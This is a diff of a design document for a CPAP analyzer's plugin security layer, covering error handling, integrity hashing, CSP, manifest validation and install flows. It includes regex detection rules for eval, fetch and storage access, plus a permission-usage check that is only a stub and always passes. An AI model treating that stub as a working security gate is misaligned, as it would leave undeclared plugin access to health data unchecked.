+): Promise<Result<PluginOutput, PluginError>> {
+  try {
+    const output = await executePluginSafely(plugin, input);
+    return { ok: true, value: output };
+  } catch (error) {
+    // Classify error for user messaging
+    const pluginError = classifyPluginError(plugin, error);
+    
+    // Log for debugging (no PHI)
+    console.error(`[PluginManager] Plugin execution failed:`, {
+      pluginId: plugin.id,
+      errorCategory: pluginError.category,
+      message: pluginError.message
+    });
+    
+    // Return error (does NOT throw, does NOT crash app)
+    return { ok: false, error: pluginError };
+  }
+}
+
+/**
+ * Classify plugin errors for appropriate handling
+ */
+function classifyPluginError(
+  plugin: PluginManifest,
+  error: unknown
+): CPAPError {
+  // Timeout
+  if (error instanceof TimeoutError) {
+    return {
+      id: generateErrorId(),
+      category: ErrorCategory.WORKER,
+      severity: ErrorSeverity.ERROR,
+      title: 'Plugin Timed Out',
+      message: `The plugin "${plugin.name}" took too long to complete and was stopped.`,
+      recoverySteps: [
+        'Try analyzing a smaller date range',
+        'Check if the plugin has configuration options to reduce complexity',
+        'Contact the plugin developer if this persists'
+      ],
+      technicalDetails: {
+        pluginId: plugin.id,
+        timeoutMs: plugin.timeoutMs,
+        errorType: 'TIMEOUT'
+      }
+    };
+  }
+  
+  // Permission denied
+  if (error instanceof SecurityError && error.code === 'PERMISSION_DENIED') {
+    return {
+      id: generateErrorId(),
+      category: ErrorCategory.USER,
+      severity: ErrorSeverity.WARNING,
+      title: 'Permission Denied',
+      message: `The plugin "${plugin.name}" attempted an action that requires additional permissions.`,
+      recoverySteps: [
+        'Reinstall the plugin and grant the required permissions',
+        'Or disable this plugin if you don\'t want to grant the permission'
+      ],
+      technicalDetails: {
+        pluginId: plugin.id,
+        error: error.message
+      }
+    };
+  }
+  
+  // Generic plugin error
+  return {
+    id: generateErrorId(),
+    category: ErrorCategory.WORKER,
+    severity: ErrorSeverity.ERROR,
+    title: 'Plugin Error',
+    message: `The plugin "${plugin.name}" encountered an error and could not complete.`,
+    recoverySteps: [
+      'Your data is safe—this error only affected the plugin',
+      'Try running the analysis again',
+      'If this persists, disable or uninstall the plugin',
+      'Report this error to the plugin developer'
+    ],
+    technicalDetails: {
+      pluginId: plugin.id,
+      error: error instanceof Error ? error.message : String(error),
+      stack: error instanceof Error ? error.stack : undefined
     }
   };
 }
 ```
 
-**User Consent**:
+#### 8.7.2 Error Boundaries for Plugin UI
+
+Visualization plugins may render React components. These are wrapped in error boundaries:
+
 ```typescript
-async function installPlugin(plugin: PluginManifest): Promise<void> {
-  // Show permission consent dialog
-  const granted = await showPermissionDialog({
-    pluginName: plugin.name,
-    permissions: plugin.permissions,
-    dataRequirements: plugin.dataRequirements
-  });
+/**
+ * Error boundary for plugin-rendered UI components
+ */
+class PluginUIErrorBoundary extends React.Component<
+  { plugin: PluginManifest; fallback?: React.ReactNode },
+  { hasError: boolean; error?: Error }
+> {
+  state = { hasError: false, error: undefined };
   
-  if (!granted) {
-    throw new Error('User denied plugin permissions');
+  static getDerivedStateFromError(error: Error) {
+    return { hasError: true, error };
   }
   
-  // Store plugin with granted permissions
-  await storePlugin(plugin);
-}
-
-function showPermissionDialog(options: {
-  pluginName: string;
-  permissions: Permission[];
-  dataRequirements: DataRequirements;
-}): Promise<boolean> {
-  return showDialog({
-    title: `Install ${options.pluginName}?`,
-    message: 'This plugin requests the following permissions:',
-    permissions: options.permissions.map(perm => ({
-      permission: perm,
-      description: PERMISSION_DESCRIPTIONS[perm]
-    })),
-    buttons: ['Deny', 'Allow']
-  });
-}
-
-const PERMISSION_DESCRIPTIONS: Record<Permission, string> = {
-  'read:sessions': 'Access to your session metadata (dates, durations, machine info)',
-  'read:aggregates': 'Access to nightly summary statistics (AHI, pressure, leak)',
-  'read:events': 'Access to detailed event data (apneas, hypopneas)',
-  'read:signals': 'Access to high-resolution signal data (flow, pressure waveforms)',
-  'read:integration:fitbit': 'Access to your Fitbit data',
-  'read:integration:weather': 'Access to your weather data',
-  'network:fetch': 'Make network requests to external services',
-  'storage:cache': 'Store cached results in browser storage'
-};
-```
-
-### 8.3 Plugin Code Review
-
-**Pre-Installation Review Checklist**:
-1. ✅ Plugin manifest is valid JSON
-2. ✅ Requested permissions match functionality
-3. ✅ Plugin code passes ESLint security rules
-4. ✅ No obfuscated code (minification allowed, but must be reversible)
-5. ✅ No `eval()`, `Function()`, or dynamic code execution
-6. ✅ No direct DOM access (plugins operate on data only)
-7. ✅ No network requests unless `network:fetch` permission granted
-8. ✅ Plugin source code available for audit (GitHub, npm, etc.)
-
-**Automated Checks**:
-```typescript
-async function validatePluginCode(pluginCode: string): Promise<ValidationResult> {
-  const warnings: string[] = [];
-  const errors: string[] = [];
-  
-  // Check for eval/Function
-  if (/\beval\s*\(/.test(pluginCode) || /\bFunction\s*\(/.test(pluginCode)) {
-    errors.push('Plugin contains eval() or Function() (prohibited)');
-  }
-  
-  // Check for fetch/XMLHttpRequest
-  if (/\b(fetch|XMLHttpRequest)\b/.test(pluginCode)) {
-    warnings.push('Plugin makes network requests (requires network:fetch permission)');
-  }
-  
-  // Check for direct storage access
-  if (/\b(indexedDB|localStorage|sessionStorage)\b/.test(pluginCode)) {
-    errors.push('Plugin accesses browser storage directly (prohibited, use DataProvider)');
-  }
-  
-  // Lint with security rules
-  const lintResults = await eslint.lintText(pluginCode);
-  for (const result of lintResults) {
-    for (const message of result.messages) {
-      if (message.severity === 2) {
-        errors.push(`ESLint error: ${message.message}`);
-      } else {
-        warnings.push(`ESLint warning: ${message.message}`);
-      }
-    }
-  }
-  
-  return { valid: errors.length === 0, errors, warnings };
-}
-```
-
-### 8.4 Plugin Update Strategy
-
-**Update Notifications**:
-```typescript
-async function checkPluginUpdates(): Promise<PluginUpdate[]> {
-  const installedPlugins = await getInstalledPlugins();
-  const updates: PluginUpdate[] = [];
-  
-  for (const plugin of installedPlugins) {
-    // Check plugin registry for updates
-    const latestVersion = await fetchLatestPluginVersion(plugin.id);
+  componentDidCatch(error: Error, errorInfo: React.ErrorInfo) {
+    console.error(`[PluginUI] Error in plugin "${this.props.plugin.id}":`, error, errorInfo);
     
-    if (semverGt(latestVersion.version, plugin.version)) {
-      updates.push({
-        pluginId: plugin.id,
-        currentVersion: plugin.version,
-        latestVersion: latestVersion.version,
-        changelog: latestVersion.changelog,
-        permissionChanges: diffPermissions(plugin.permissions, latestVersion.permissions)
-      });
-    }
+    // Report to plugin error store (for user to export)
+    reportPluginUIError({
+      pluginId: this.props.plugin.id,
+      error: error.message,
+      stack: error.stack,
+      componentStack: errorInfo.componentStack
+    });
   }
   
-  return updates;
+  render() {
+    if (this.state.hasError) {
+      return (
+        this.props.fallback || (
+          <Alert severity="error">
+            <AlertTitle>Plugin Error: {this.props.plugin.name}</AlertTitle>
+            <Typography variant="body2">
+              This plugin encountered an error while rendering. Your data is safe.
+            </Typography>
+            <Button onClick={() => this.setState({ hasError: false, error: undefined })}>
+              Try Again
+            </Button>
+            <Button onClick={() => disablePlugin(this.props.plugin.id)}>
+              Disable Plugin
+            </Button>
+          </Alert>
+        )
+      );
+    }
+    
+    return this.props.children;
+  }
 }
 
-// User must explicitly approve updates
-async function updatePlugin(pluginId: string): Promise<void> {
-  const update = await fetchPluginUpdate(pluginId);
+/**
+ * Usage: Wrap plugin UI in error boundary
+ */
+function PluginVisualization({ plugin, data }: { plugin: VisualizationPlugin; data: unknown }) {
+  return (
+    <PluginUIErrorBoundary plugin={plugin.manifest}>
+      <plugin.ComponentType data={data} />
+    </PluginUIErrorBoundary>
+  );
+}
+```
+
+#### 8.7.3 User Notification Pattern
+
+```typescript
+/**
+ * User-friendly error notification for plugin failures
+ */
+function notifyPluginFailure(plugin: PluginManifest, error: CPAPError): void {
+  showNotification({
+    severity: 'error',
+    title: error.title,
+    message: error.message,
+    actions: [
+      {
+        label: 'View Details',
+        onClick: () => showErrorDetails(error)
+      },
+      {
+        label: 'Disable Plugin',
+        onClick: () => disablePlugin(plugin.id)
+      },
+      {
+        label: 'Dismiss',
+        onClick: () => {} // Close notification
+      }
+    ],
+    autoHideDuration: null // Require explicit dismissal for plugin errors
+  });
+}
+
+/**
+ * Example usage in plugin execution flow
+ */
+async function runAnalysis(plugin: PluginManifest, input: PluginInput): Promise<void> {
+  const result = await executePluginIsolated(plugin, input);
   
-  // If permissions changed, require re-consent
-  if (update.permissionChanges.length > 0) {
-    const granted = await showPermissionDialog({
-      pluginName: update.name,
-      permissions: update.newPermissions,
-      message: 'This update requests new permissions:'
+  if (!result.ok) {
+    // Plugin failed, notify user (app still functional)
+    notifyPluginFailure(plugin, result.error);
+    return;
+  }
+  
+  // Success: save and display result
+  await savePluginResult(result.value);
+  showSuccessNotification(`Analysis complete: ${plugin.name}`);
+}
+```
+
+### 8.8 Code Integrity
+
+**Principle**: Verify plugin code has not been tampered with since installation.
+
+#### 8.8.1 Plugin Manifest Integrity Hash
+
+```typescript
+/**
+ * Verify plugin code integrity using SHA-256 hash
+ */
+async function verifyPluginIntegrity(
+  manifest: PluginManifest
+): Promise<{ valid: boolean; error?: string }> {
+  try {
+    // Fetch plugin code
+    const response = await fetch(manifest.main);
+    const code = await response.text();
+    
+    // Compute hash
+    const encoder = new TextEncoder();
+    const data = encoder.encode(code);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    const computedHash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    
+    // Compare with manifest hash
+    if (computedHash !== manifest.integrityHash) {
+      return {
+        valid: false,
+        error: `Integrity hash mismatch: expected ${manifest.integrityHash}, got ${computedHash}`
+      };
+    }
+    
+    return { valid: true };
+  } catch (error) {
+    return {
+      valid: false,
+      error: `Integrity verification failed: ${error instanceof Error ? error.message : String(error)}`
+    };
+  }
+}
+
+/**
+ * Generate integrity hash for plugin during development
+ */
+async function generatePluginIntegrityHash(pluginCode: string): Promise<string> {
+  const encoder = new TextEncoder();
+  const data = encoder.encode(pluginCode);
+  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+  const hashArray = Array.from(new Uint8Array(hashBuffer));
+  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+}
+```
+
+#### 8.8.2 Subresource Integrity (SRI) for External Assets
+
+If plugins load external scripts or stylesheets:
+
+```typescript
+/**
+ * Plugin manifest with SRI hashes for external dependencies
+ */
+interface PluginManifest {
+  // ... other fields
+  
+  /**
+   * External resources with Subresource Integrity hashes
+   */
+  externalResources?: {
+    url: string;
+    integrity: string; // SRI hash (e.g., "sha384-...")
+    crossorigin?: 'anonymous' | 'use-credentials';
+  }[];
+}
+
+/**
+ * Load external resource with SRI verification
+ */
+async function loadExternalResource(resource: {
+  url: string;
+  integrity: string;
+  crossorigin?: string;
+}): Promise<void> {
+  return new Promise((resolve, reject) => {
+    const script = document.createElement('script');
+    script.src = resource.url;
+    script.integrity = resource.integrity;
+    script.crossOrigin = resource.crossorigin || 'anonymous';
+    
+    script.onload = () => resolve();
+    script.onerror = () => reject(new Error(`Failed to load ${resource.url}`));
+    
+    document.head.appendChild(script);
+  });
+}
+```
+
+**Note**: We prefer **bundling** plugin dependencies over external script loading. SRI is a fallback for plugins that must load external resources.
+
+#### 8.8.3 No eval() or Function() in Plugin Context
+
+```typescript
+/**
+ * CSP header prevents eval() and new Function()
+ */
+const CSP_HEADER = `
+  default-src 'self';
+  script-src 'self';
+  script-src-elem 'self';
+  worker-src 'self' blob:;
+  object-src 'none';
+  base-uri 'self';
+`.trim().replace(/\s+/g, ' ');
+
+// In plugin worker, eval/Function are blocked by CSP
+// Attempt to use eval() throws: EvalError: Refused to evaluate a string as JavaScript
+```
+
+**Static code analysis** during plugin installation also checks for `eval` and `Function` usage:
+
+```typescript
+function validateNoEval(pluginCode: string): { valid: boolean; violations: string[] } {
+  const violations: string[] = [];
+  
+  // Check for eval
+  if (/\beval\s*\(/.test(pluginCode)) {
+    violations.push('Uses eval() (prohibited)');
+  }
+  
+  // Check for Function constructor
+  if (/\bnew\s+Function\s*\(/.test(pluginCode) || /\bFunction\s*\(/.test(pluginCode)) {
+    violations.push('Uses Function() constructor (prohibited)');
+  }
+  
+  // Check for setTimeout/setInterval with string arguments (also eval-like)
+  if (/(setTimeout|setInterval)\s*\(\s*["'`]/.test(pluginCode)) {
+    violations.push('Uses setTimeout/setInterval with string argument (prohibited)');
+  }
+  
+  return {
+    valid: violations.length === 0,
+    violations
+  };
+}
+```
+
+### 8.9 Plugin Loading & Verification
+
+**Principle**: Plugins are validated before installation and verified on every load.
+
+#### 8.9.1 Plugin Manifest Schema Validation
+
+```typescript
+/**
+ * Zod schema for plugin manifest validation
+ */
+import { z } from 'zod';
+
+const PluginPermissionSchema = z.enum([
+  'storage.read',
+  'storage.write',
+  'storage.delete',
+  'data.sessions',
+  'data.aggregates',
+  'data.events',
+  'data.signals',
+  'data.notes',
+  'data.integrations.fitbit',
+  'data.integrations.weather',
+  'network',
+  'export',
+  'ui.render'
+]);
+
+const PluginManifestSchema = z.object({
+  // Required fields
+  id: z.string().regex(/^[a-z0-9-_.]+$/),
+  name: z.string().min(1).max(100),
+  version: z.string().regex(/^\d+\.\d+\.\d+$/), // Semantic versioning
+  author: z.string().min(1).max(100),
+  description: z.string().min(10).max(500),
+  type: z.enum(['machine', 'analysis', 'visualization', 'integration', 'export']),
+  permissions: z.array(PluginPermissionSchema),
+  integrityHash: z.string().regex(/^[a-f0-9]{64}$/), // SHA-256 hash
+  main: z.string().url(),
+  
+  // Optional fields
+  sourceUrl: z.string().url().optional(),
+  dataRequirements: z.object({
+    signals: z.array(z.string()).optional(),
+    minSessionCount: z.number().int().positive().optional(),
+    maxMemoryMB: z.number().int().positive().optional()
+  }).optional(),
+  timeoutMs: z.number().int().positive().max(300_000).optional(), // Max 5 minutes
+  maxMemoryMB: z.number().int().positive().max(2048).optional() // Max 2GB
+});
+
+type PluginManifest = z.infer<typeof PluginManifestSchema>;
+
+/**
+ * Validate plugin manifest during installation
+ */
+function validateManifestSchema(manifest: unknown): { valid: boolean; errors: string[] } {
+  const result = PluginManifestSchema.safeParse(manifest);
+  
+  if (result.success) {
+    return { valid: true, errors: [] };
+  }
+  
+  const errors = result.error.errors.map(err => `${err.path.join('.')}: ${err.message}`);
+  return { valid: false, errors };
+}
+```
+
+#### 8.9.2 Pre-Installation Validation Checklist
+
+```typescript
+/**
+ * Complete pre-installation validation
+ */
+async function validatePluginForInstallation(
+  manifest: PluginManifest,
+  code: string
+): Promise<{ valid: boolean; errors: string[]; warnings: string[] }> {
+  const errors: string[] = [];
+  const warnings: string[] = [];
+  
+  // 1. Manifest schema
+  const schemaValidation = validateManifestSchema(manifest);
+  if (!schemaValidation.valid) {
+    errors.push(...schemaValidation.errors);
+    return { valid: false, errors, warnings }; // Can't continue without valid manifest
+  }
+  
+  // 2. Code integrity
+  const integrityCheck = await verifyPluginIntegrity(manifest);
+  if (!integrityCheck.valid) {
+    errors.push(`Integrity verification failed: ${integrityCheck.error}`);
+  }
+  
+  // 3. No eval/Function
+  const noEvalCheck = validateNoEval(code);
+  if (!noEvalCheck.valid) {
+    errors.push(...noEvalCheck.violations);
+  }
+  
+  // 4. ESLint security rules
+  const lintResult = await lintPluginCode(code);
+  errors.push(...lintResult.errors);
+  warnings.push(...lintResult.warnings);
+  
+  // 5. Permissions match code usage
+  const permissionCheck = analyzeCodeForPermissionUsage(code);
+  if (permissionCheck.undeclaredUsage.length > 0) {
+    errors.push(
+      `Code uses APIs not declared in permissions: ${permissionCheck.undeclaredUsage.join(', ')}`
+    );
+  }
+  if (permissionCheck.unusedPermissions.length > 0) {
+    warnings.push(
+      `Declared permissions not used in code: ${permissionCheck.unusedPermissions.join(', ')}`
+    );
+  }
+  
+  // 6. Check for obfuscation (heuristic)
+  const obfuscationCheck = detectObfuscation(code);
+  if (obfuscationCheck.isObfuscated) {
+    warnings.push(
+      `Code appears to be obfuscated: ${obfuscationCheck.indicators.join(', ')}`
+    );
+  }
+  
+  return {
+    valid: errors.length === 0,
+    errors,
+    warnings
+  };
+}
+
+/**
+ * Analyze code to detect permission usage
+ */
+function analyzeCodeForPermissionUsage(code: string): {
+  declaredPermissions: PluginPermission[];
+  usedApis: string[];
+  undeclaredUsage: string[];
+  unusedPermissions: PluginPermission[];
+} {
+  // Simple heuristic: check for API method calls in code
+  const apiUsage: Record<string, PluginPermission> = {
+    'getSessions': 'data.sessions',
+    'getNightlyAggregates': 'data.aggregates',
+    'getEvents': 'data.events',
+    'getSignalData': 'data.signals',
+    'saveResult': 'storage.write',
+    'fetch': 'network'
+  };
+  
+  const usedApis = Object.keys(apiUsage).filter(api => code.includes(api));
+  const requiredPermissions = usedApis.map(api => apiUsage[api]);
+  
+  // (In real implementation, use AST parsing for accurate detection)
+  
+  return {
+    declaredPermissions: [], // From manifest
+    usedApis,
+    undeclaredUsage: [], // Permissions needed but not declared
+    unusedPermissions: []  // Permissions declared but not used
+  };
+}
+
+/**
+ * Detect code obfuscation (heuristic)
+ */
+function detectObfuscation(code: string): {
+  isObfuscated: boolean;
+  indicators: string[];
+} {
+  const indicators: string[] = [];
+  
+  // Very long identifier names (common in obfuscators)
+  if (/\b[a-zA-Z_$][a-zA-Z0-9_$]{50,}\b/.test(code)) {
+    indicators.push('Unusually long identifier names');
+  }
+  
+  // Excessive string escaping
+  const escapeCount = (code.match(/\\x[0-9a-f]{2}/gi) || []).length;
+  if (escapeCount > 50) {
+    indicators.push('Excessive hex-escaped strings');
+  }
+  
+  // Very low average identifier length (obfuscated names: a, b, c, etc.)
+  const identifiers = code.match(/\b[a-zA-Z_$][a-zA-Z0-9_$]*\b/g) || [];
+  const avgLength = identifiers.reduce((sum, id) => sum + id.length, 0) / identifiers.length;
+  if (avgLength < 2) {
+    indicators.push('Very short identifier names (average < 2 chars)');
+  }
+  
+  return {
+    isObfuscated: indicators.length > 0,
+    indicators
+  };
+}
+```
+
+#### 8.9.3 User Review Before Enabling
+
+```typescript
+/**
+ * Installation flow with user review step
+ */
+async function installPluginWorkflow(manifest: PluginManifest): Promise<void> {
+  // 1. Fetch plugin code
+  const code = await fetchPluginCode(manifest.main);
+  
+  // 2. Validate
+  const validation = await validatePluginForInstallation(manifest, code);
+  
+  // 3. Show validation results to user
+  if (!validation.valid) {
+    throw new ValidationError(
+      `Plugin validation failed:\n${validation.errors.join('\n')}`,
+      'PLUGIN_VALIDATION_FAILED',
+      { errors: validation.errors, warnings: validation.warnings }
+    );
+  }
+  
+  if (validation.warnings.length > 0) {
+    const proceed = await showValidationWarningsDialog({
+      pluginName: manifest.name,
+      warnings: validation.warnings
     });
     
-    if (!granted) {
-      throw new Error('User denied new permissions');
+    if (!proceed) {
+      throw new UserCancelledError('User cancelled plugin installation after reviewing warnings');
     }
   }
   
-  // Validate new plugin code
-  const validation = await validatePluginCode(update.code);
-  if (!validation.valid) {
-    throw new Error(`Plugin validation failed: ${validation.errors.join(', ')}`);
+  // 4. Request permissions (user consent)
+  const consent = await showPluginConsentDialog(manifest);
+  if (!consent.granted) {
+    throw new UserCancelledError('User denied plugin permissions');
   }
   
-  // Install update
-  await installPlugin(update);
+  // 5. Install
+  await pluginRegistry.install({
+    manifest,
+    code,
+    installedAt: new Date().toISOString(),
+    grantedPermissions: consent.grantedPermissions,
+    enabled: true
+  });
+  
+  showSuccessNotification(`Plugin installed: ${manifest.name}`);
 }
 ```
+
+#### 8.9.4 Disable Mechanism
+
+```typescript
+/**
+ * User can disable problematic plugins without uninstalling
+ */
+async function disablePlugin(pluginId: string): Promise<void> {
+  const plugin = await pluginRegistry.get(pluginId);
+  if (!plugin) {
+    throw new Error(`Plugin not found: ${pluginId}`);
+  }
+  
+  // Set enabled flag to false
+  plugin.enabled = false;
+  await pluginRegistry.update(plugin);
+  
+  // Terminate any running workers for this plugin
+  await terminatePluginWorkers(pluginId);
+  
+  console.log(`[PluginManager] Disabled plugin: ${pluginId}`);
+}
+
+/**
+ * Re-enable a disabled plugin (re-validates first)
+ */
+async function enablePlugin(pluginId: string): Promise<void> {
+  const plugin = await pluginRegistry.get(pluginId);
+  if (!plugin) {
+    throw new Error(`Plugin not found: ${pluginId}`);
+  }
+  
+  // Re-verify integrity
+  const integrityCheck = await verifyPluginIntegrity(plugin.manifest);
+  if (!integrityCheck.valid) {
+    throw new SecurityError(
+      `Cannot enable plugin: integrity verification failed: ${integrityCheck.error}`,
+      'INTEGRITY_VERIFICATION_FAILED'
+    );
+  }
+  
+  plugin.enabled = true;
+  await pluginRegistry.update(plugin);
+  
+  console.log(`[PluginManager] Enabled plugin: ${pluginId}`);
+}
+```
+
+### 8.10 Third-Party Plugin Concerns
+
+**Status**: First-party plugins only (v1.0). Third-party plugin marketplace is a **future enhancement**.
+
+#### 8.10.1 Plugin Marketplace Considerations (Future)
+
+When we support third-party plugins in a marketplace:
+
+**Required**:
+
+1. **Code Review Process**: All plugins must pass security review by maintainers
+2. **Developer Verification**: Plugin developers must verify their identity (email, GitHub)
+3. **Binary Transparency**: Plugin source code must be publicly available for audit
+4. **User Ratings & Reports**: Users can rate plugins and report security concerns
+5. **Automated Scanning**: CI pipeline scans plugins for:
+   - Known vulnerabilities (npm audit, Snyk)
+   - Obfuscated code (detection heuristics)
+   - Suspicious API usage (AST analysis)
+6. **Revocation Mechanism**: Ability to remotely disable plugins if vulnerability discovered
+
+**Recommendations for Plugin Developers**:
+
+```markdown
+# Plugin Security Checklist for Developers
+
+## Before Submission
+- [ ] Run `npm audit` and fix all high/critical vulnerabilities
+- [ ] Remove all unused dependencies
+- [ ] Provide source code repository (GitHub, GitLab, etc.)
+- [ ] Include unit tests (>80% coverage)
+- [ ] Document all required permissions in README
+- [ ] Do not obfuscate code (minification OK, obfuscation not allowed)
+- [ ] Do not use eval(), Function(), or other dynamic code execution
+- [ ] Follow principle of least privilege (request minimal permissions)
+
+## During Development
+- [ ] Use TypeScript for type safety
+- [ ] Validate all inputs (user data, API responses)
+- [ ] Handle errors gracefully (don't crash)
+- [ ] Respect timeouts (complex analyses should report progress)
+- [ ] Test with malformed data (corrupted EDF files, etc.)
+
+## After Release
+- [ ] Respond to security reports within 48 hours
+- [ ] Publish security updates promptly
+- [ ] Document changes in CHANGELOG with security-relevant notes
+```
+
+#### 8.10.2 User Warnings for Unverified Plugins
+
+```typescript
+/**
+ * Plugin verification status
+ */
+enum PluginVerificationStatus {
+  OFFICIAL = 'official',        // Developed by CPAP Analyzer team
+  VERIFIED = 'verified',        // Third-party, passed security review
+  UNVERIFIED = 'unverified',    // Third-party, not reviewed
+  REVOKED = 'revoked'           // Security issue detected, disabled
+}
+
+/**
+ * Show warning for unverified plugins
+ */
+function PluginInstallWarning({ manifest }: { manifest: PluginManifest }) {
+  const verificationStatus = getPluginVerificationStatus(manifest);
+  
+  if (verificationStatus === PluginVerificationStatus.OFFICIAL) {
+    return null; // No warning for official plugins
+  }
+  
+  if (verificationStatus === PluginVerificationStatus.REVOKED) {
+    return (
+      <Alert severity="error">
+        <AlertTitle>Security Warning: This Plugin Has Been Revoked</AlertTitle>
+        <Typography>
+          This plugin has been disabled due to a security vulnerability.
+          Do not install or enable this plugin.
+        </Typography>
+      </Alert>
+    );
+  }
+  
+  if (verificationStatus === PluginVerificationStatus.UNVERIFIED) {
+    return (
+      <Alert severity="warning">
+        <AlertTitle>Unverified Plugin</AlertTitle>
+        <Typography>
+          This plugin has not been reviewed by the CPAP Analyzer security team.
+          Only install plugins from developers you trust.
+        </Typography>
+        <Typography variant="body2" sx={{ mt: 1 }}>
+          ⚠️ Unverified plugins may:
+          <ul>
+            <li>Contain bugs that corrupt your data</li>
+            <li>Send your health data to external servers</li>
+            <li>Crash the application</li>
+          </ul>
+        </Typography>
+      </Alert>
+    );
+  }
+  
+  return null;
+}
+```
+
+#### 8.10.3 Plugin Signing & Verification (Future Enhancement)
+
+**Code signing** for plugin authenticity:
+
+```typescript
+/**
+ * Future: Plugin signed with developer's private key
+ */
+interface SignedPluginManifest extends PluginManifest {
+  /**
+   * Digital signature (RSA or Ed25519)
+   * Signature is over: id, version, integrityHash, author
+   */
+  signature: string;
+  
+  /**
+   * Developer's public key for signature verification
+   */
+  publicKey: string;
+}
+
+/**
+ * Verify plugin signature
+ */
+async function verifyPluginSignature(
+  manifest: SignedPluginManifest
+): Promise<{ valid: boolean; error?: string }> {
+  try {
+    // Import developer's public key
+    const publicKey = await crypto.subtle.importKey(
+      'spki',
+      base64Decode(manifest.publicKey),
+      { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' },
+      false,
+      ['verify']
+    );
+    
+    // Construct signed data
+    const signedData = JSON.stringify({
+      id: manifest.id,
+      version: manifest.version,
+      integrityHash: manifest.integrityHash,
+      author: manifest.author
+    });
+    
+    // Verify signature
+    const signature = base64Decode(manifest.signature);
+    const encoder = new TextEncoder();
+    const data = encoder.encode(signedData);
+    
+    const isValid = await crypto.subtle.verify(
+      'RSASSA-PKCS1-v1_5',
+      publicKey,
+      signature,
+      data
+    );
+    
+    return { valid: isValid };
+  } catch (error) {
+    return {
+      valid: false,
+      error: `Signature verification failed: ${error instanceof Error ? error.message : String(error)}`
+    };
+  }
+}
+```
+
+### 8.11 Integration with Error Handling Architecture
+
+Plugin errors are classified using the existing error taxonomy from [error-handling-architecture.md](error-handling-architecture.md).
+
+#### 8.11.1 Plugin Error Categories
+
+Plugin-related errors map to the error taxonomy:
+
+| Plugin Error | Error Category | Severity | User Message Example |
+| ------------ | -------------- | -------- | -------------------- |
+| Permission denied | `USER` | `WARNING` | "Plugin needs additional permission" |
+| Timeout | `WORKER` | `ERROR` | "Plugin took too long to complete" |
+| Memory limit exceeded | `WORKER` | `ERROR` | "Plugin used too much memory" |
+| Invalid result | `DATA` | `ERROR` | "Plugin produced invalid analysis result" |
+| Network request failed | `NETWORK` | `ERROR` | "Plugin could not reach external service" |
+| Worker crash | `WORKER` | `ERROR` | "Plugin encountered an error" |
+| Code validation failed | `SYSTEM` | `ERROR` | "Plugin code failed security checks" |
+
+```typescript
+/**
+ * Convert plugin-specific errors to CPAPError
+ */
+function pluginErrorToCPAPError(
+  plugin: PluginManifest,
+  error: PluginExecutionError
+): CPAPError {
+  const baseError: Omit<CPAPError, 'category' | 'severity' | 'title' | 'message' | 'recoverySteps'> = {
+    id: generateErrorId(),
+    timestamp: new Date().toISOString(),
+    technicalDetails: {
+      pluginId: plugin.id,
+      pluginVersion: plugin.version,
+      errorType: error.type
+    }
+  };
+  
+  switch (error.type) {
+    case 'TIMEOUT':
+      return {
+        ...baseError,
+        category: ErrorCategory.WORKER,
+        severity: ErrorSeverity.ERROR,
+        title: 'Plugin Timeout',
+        message: `The plugin "${plugin.name}" took too long and was stopped.`,
+        recoverySteps: [
+          'Try analyzing a smaller date range',
+          'Check plugin settings for complexity options',
+          'Contact plugin developer if issue persists'
+        ]
+      };
+      
+    case 'MEMORY_LIMIT':
+      return {
+        ...baseError,
+        category: ErrorCategory.WORKER,
+        severity: ErrorSeverity.ERROR,
+        title: 'Plugin Memory Limit',
+        message: `The plugin "${plugin.name}" used too much memory and was stopped.`,
+        recoverySteps: [
+          'Try analyzing a smaller dataset',
+          'Close other browser tabs to free memory',
+          'Contact plugin developer to report this issue'
+        ]
+      };
+      
+    case 'PERMISSION_DENIED':
+      return {
+        ...baseError,
+        category: ErrorCategory.USER,
+        severity: ErrorSeverity.WARNING,
+        title: 'Permission Required',
+        message: `The plugin "${plugin.name}" requires additional permissions.`,
+        recoverySteps: [
+          'Reinstall the plugin and grant the required permissions',
+          'Or disable this plugin'
+        ]
+      };
+      
+    case 'INVALID_RESULT':
+      return {
+        ...baseError,
+        category: ErrorCategory.DATA,
+        severity: ErrorSeverity.ERROR,
+        title: 'Invalid Plugin Result',
+        message: `The plugin "${plugin.name}" produced invalid data.`,
+        recoverySteps: [
+          'Your data is safe—only the plugin result was affected',
+          'Try running the analysis again',
+          'Report this to the plugin developer',
+          'Consider disabling this plugin'
+        ]
+      };
+      
+    default:
+      return {
+        ...baseError,
+        category: ErrorCategory.WORKER,
+        severity: ErrorSeverity.ERROR,
+        title: 'Plugin Error',
+        message: `The plugin "${plugin.name}" encountered an error.`,
+        recoverySteps: [
+          'Your data is safe',
+          'Try again',
+          'If this persists, disable the plugin'
+        ]
+      };
+  }
+}
+```
+
+#### 8.11.2 Plugin Error Recovery Patterns
+
+```typescript
+/**
+ * Retry logic for transient plugin failures
+ */
+async function executePluginWithRetry(
+  plugin: PluginManifest,
+  input: PluginInput,
+  maxRetries: number = 2
+): Promise<Result<PluginOutput, CPAPError>> {
+  let lastError: CPAPError | undefined;
+  
+  for (let attempt = 0; attempt <= maxRetries; attempt++) {
+    const result = await executePluginIsolated(plugin, input);
+    
+    if (result.ok) {
+      return result; // Success
+    }
+    
+    lastError = result.error;
+    
+    // Retry only for transient errors
+    const isRetryable = [ErrorCategory.WORKER, ErrorCategory.NETWORK].includes(
+      result.error.category
+    );
+    
+    if (!isRetryable || attempt === maxRetries) {
+      break; // Give up
+    }
+    
+    // Exponential backoff
+    const delayMs = Math.pow(2, attempt) * 1000;
+    await sleep(delayMs);
+    
+    console.log(`[PluginManager] Retrying plugin ${plugin.id}, attempt ${attempt + 1}`);
+  }
+  
+  return { ok: false, error: lastError! };
+}
+
+/**
+ * Fallback when required plugin fails
+ */
+async function executeAnalysisWithFallback(
+  preferredPlugin: PluginManifest,
+  fallbackPlugin: PluginManifest,
+  input: PluginInput
+): Promise<PluginOutput> {
+  // Try preferred plugin
+  const preferredResult = await executePluginWithRetry(preferredPlugin, input);
+  
+  if (preferredResult.ok) {
+    return preferredResult.value;
+  }
+  
+  // Notify user of fallback
+  showNotification({
+    severity: 'warning',
+    title: 'Using Fallback Analysis',
